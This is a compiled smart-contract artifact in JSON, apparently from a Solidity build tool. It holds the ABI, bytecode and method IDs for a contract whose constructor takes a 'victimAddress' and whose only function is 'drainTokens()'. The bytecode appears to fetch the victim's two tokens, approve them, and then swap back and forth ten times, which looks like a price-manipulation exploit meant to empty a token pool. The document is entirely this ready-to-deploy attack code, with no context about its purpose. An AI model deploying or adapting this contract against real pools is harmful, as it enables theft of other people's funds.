{"abi":[{"type":"constructor","inputs":[{"name":"victimAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"drainTokens","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60a060405234801561000f575f5ffd5b5060405161055438038061055483398101604081905261002e9161003f565b6001600160a01b031660805261006c565b5f6020828403121561004f575f5ffd5b81516001600160a01b0381168114610065575f5ffd5b9392505050565b6080516104bc6100985f395f818160590152818161010b0152818161021201526102a501526104bc5ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c8063ef1706ce1461002d575b5f5ffd5b610035610037565b005b6040805160028082526060820183525f926020830190803683370190505090507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100b3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100d7919061040d565b815f815181106100e9576100e961043a565b60200260200101906001600160a01b031690816001600160a01b0316815250507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166325be124e6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610165573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610189919061040d565b8160018151811061019c5761019c61043a565b6001600160a01b03909216602092830291909101909101525f5b6002811015610297578181815181106101d1576101d161043a565b60209081029190910101516040517fe1f21c670000000000000000000000000000000000000000000000000000000081523360048201526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166024830152620f424060448301529091169063e1f21c67906064016020604051808303815f875af115801561026a573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061028e9190610467565b506001016101b6565b505f5b600a811015610409577f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663df791e50835f815181106102e4576102e461043a565b6020026020010151846001815181106102ff576102ff61043a565b60209081029190910101516040517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b1681526001600160a01b03928316600482015291166024820152620f424060448201526064015f604051808303815f87803b158015610370575f5ffd5b505af1158015610382573d5f5f3e3d5ffd5b50505050816001815181106103995761039961043a565b6020026020010151825f815181106103b3576103b361043a565b6020026020010151835f815181106103cd576103cd61043a565b60200260200101846001815181106103e7576103e761043a565b6001600160a01b0393841660209182029290920101529116905260010161029a565b5050565b5f6020828403121561041d575f5ffd5b81516001600160a01b0381168114610433575f5ffd5b9392505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f60208284031215610477575f5ffd5b81518015158114610433575f5ffdfea264697066735822122008f710918f9fe24d0d64c7c502f5613163b951207c13e6b3e9b586f3db33889664736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"drainTokens()":"ef1706ce"},"id":0}